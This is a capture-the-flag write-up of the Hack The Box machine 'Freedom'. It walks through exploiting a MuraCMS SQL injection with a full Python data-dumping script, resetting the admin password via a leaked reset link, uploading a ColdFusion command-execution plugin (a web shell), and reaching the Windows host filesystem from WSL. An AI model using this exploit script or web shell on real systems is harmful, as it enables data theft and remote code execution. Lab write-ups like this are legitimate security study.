---
icon: server
---

# Freedom

### Challenge Description

In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.

### Flags

User flag: `HTB{c4n_y0u_pl34as3_cr4ck?}`

Root flag: `HTB{l34ky_h4ndl3rs_4th3_w1n}`

***

### Enumeration

We start with `nmap` per usual, and we found an HTTP server, a DNS server and multiple services for Active Directory.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

After setting the hostname of this IP to `freedom.htb`, we can now access the website.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

From the HTML source code, we can see that this website is built using MuraCMS, evident from the JS and CSS files imported to the HTML.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

After some research, I have found an [SQL Injection vulnerability](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS?tab=readme-ov-file#details) on this website. With this injection, I managed to dump every table using the script below. Credits to NeoZap for creating this script.

```python
import re
import requests

def sqli(payload):
    url = f"http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid={payload}&previewID=x"
    res = requests.get(url)
    data = res.json()
    try:
        table_name = re.findall(r"'\n(.+?)'", data["error"]["stacktrace"]["message"])[0]
        return table_name
    except:
        return None

def fetch_data(query, use_chunks=False):
    """Fetch data with optional chunking for long values"""
    if not use_chunks:
        # Try simple fetch first
        payload = f"x\\' or updatexml(null,concat(0x0a,({query})),null) -- a"
        result = sqli(payload)
        # If result is 31 chars, it might be truncated - retry with chunks
        if result and len(result) == 31:
            use_chunks = True
        else:
            return result

    if use_chunks:
        full_data = ""
        chunk_size = 30
        chunk_index = 1
        while True:
            chunk_payload = f"x\\' or updatexml(null,concat(0x0a,SUBSTRING(({query}), {chunk_index}, {chunk_size})),null) -- a"
            chunk = sqli(chunk_payload)
            if not chunk or chunk == "":
                break
            full_data += chunk
            chunk_index += chunk_size
        return full_data
    
    return None

def fetch_table(table_name):
    column_names = []
    data = []
    
    # Get column count
    payload = f"x\\' or updatexml(null,concat(0x0a,(select COUNT(*) from information_schema.columns WHERE table_name=\"{table_name}\" LIMIT 1)),null) -- a"
    columns_count = sqli(payload)
    
    # Fetch column names
    for i in range(int(columns_count)):
        column_query = f"select column_name from information_schema.columns WHERE table_name=\"{table_name}\" LIMIT {i},1"
        column_name = fetch_data(column_query)
        if column_name:
            column_names.append(column_name)
        else:
            break

    # Get row count
    payload = f"x\\' or updatexml(null,concat(0x0a,(select COUNT(*) from {table_name} LIMIT 1)),null) -- a"
    length = sqli(payload)
    
    # Fetch all data
    for i in range(int(length)):
        row = {}
        for column_name in column_names:
            data_query = f"select {column_name} from {table_name} LIMIT {i},1"
            value = fetch_data(data_query)
            row[column_name] = value
        data.append(row)

    return data

def fetch_all_tables():
    tables = []
    i = 0
    while True:
        query = f"select table_name from information_schema.tables LIMIT {i},1"
        table_name = fetch_data(query)
        if not table_name:
            break
        print(f"[#{i}]: {table_name}")
        table_data = fetch_table(table_name)
        print(f"[#{i}]: {table_data}")
        tables.append({"table": table_name, "data": table_data})
        i += 1
    return tables

fetch_all_tables()
```

One interesting table is `tusers`since all user information is stored there. We can see that there is an admin account present.

```json
// cut and formatted for brevity
[
  // ...
  {
    "UserID":"4117F4DF-028C-47CC-B953835D091F1E82",
    "GroupName":null,
    "Fname":"Admin",
    "Lname":"User",
    "UserName":"admin",
    "password":"$2a$10$xHRN1/9qFGtMAPkwQeMLYes2ysff2K970UTQDneDwJBRqUP7X8g3q",
    "PasswordCreated":"2024-11-11 16:57:59",
    "Email":"admin@freedom.htb",
    "Company":null,
    "JobTitle":null,
    "mobilePhone":null,
    "Website":null,
    "Type":"2",
    "subType":"Default",
    "Ext":null,
    "ContactForm":null,
    "Admin":null,
    "S2":"1",
    "LastLogin":"2024-12-02 11:25:13",
    "LastUpdate":"2024-11-11 08:46:23",
    "LastUpdateBy":"System",
    "LastUpdateByID":"22FC551F-FABE-EA01-C6EDD0885DDC1682",
    "Perm":"0",
    "InActive":"0",
    "isPublic":"0",
    "SiteID":"default",
    "Subscribe":"0",
    "notes":null,
    "description":null,
    "interests":null,
    "keepPrivate":"0",
    "photoFileID":null,
    "IMName":null,
    "IMService":null,
    "created":"2024-11-11 08:46:23",
    "remoteID":null,
    "tags":null,
    "tablist":null
  },
  // ...
]
```

### Initial Access

After obtaining this information I realized since this is a CMS, there could be a reset password mechanism in place. Turns out, there is on the admin login on `http://freedom.htb/admin`.

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

After entering the admin email and re-running the table dump script, I have found that the `tredirects`table will store the URL to edit the profile.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

When accessing the URL, we can now reset the admin's password to persist our access.

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

CMS applications usually have some sort of plugin systems, and that is also the case for Mura/MasaCMS. Since plugins are executable, we can leverage this to get some sort of RCE. I have made (re: asked ChatGPT to make me one) a MasaCMS plugin to run shell commands.

```html
<!--- execute.cfm --->
<cftry>
    <!--- Get the query parameter "cmd" --->
    <cfparam name="url.cmd" default="">

    <!--- Use cfexecute to run the command from the query parameter --->
    <cfexecute name="#url.cmd#" variable="output" timeout="10"></cfexecute>

    <!--- Output the result --->
    <cfoutput>
        Executed Command: #url.cmd#<br>
        Output: #output#
    </cfoutput>

    <cfcatch type="any">
        <!--- Handle errors securely --->
        <cfoutput>Error: #cfcatch.message#</cfoutput>
    </cfcatch>
</cftry>
```

And MasaCMS also needs a `config.xml.cfm`file on the `plugins/` directory. I basically stole this from the documentation.

```html
<plugin>
<name>My First Plugin</name>
<package>MyFirstPlugin</package>
<loadPriority>5</loadPriority>
<version>1.0</version>
<provider>Blue River Interactive Group</provider>
<providerURL>http://www.blueriver.com</providerURL>
<category>Utility</category>
<directoryFormat>packageOnly</directoryFormat>
<ormCFCLocation>/orm</ormCFCLocation>
<customTagPaths>customtags</customTagPaths>
<autoDeploy>true</autoDeploy>
<siteID>siteA,siteB</siteID>
<mappings>...</mappings>
<settings>...</settings>
<eventHandlers>...</eventHandlers>
<displayobjects>...</displayobjects>
<extensions>...</extensions>
</plugin>
```

After zipping the files together and adding a new plugin, we can access it on `http://freedom.htb/plugins/MyFirstPlugin/index.cfm?cmd=<your command>` .

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

From here, we can make our access easier by using a reverse shell.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

### Sandbox Escape

We got stuck here for a while since I cannot find the root flag or user flag anywhere, until my teammate NeoZap found something inside the `/etc/resolv.conf`file.

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

This means this Linux instance is actually hosted on a Windows machine. So it could mean that the flags are actually in the Windows part of the host machine. To access the host Windows filesystem, we can access it from the `/mnt/c` directory. And from there we can get the user flag on the `j.bret`'s Desktop directory.

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

The root flag is going to be on the `Administrator`'s (duh) Desktop directory.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
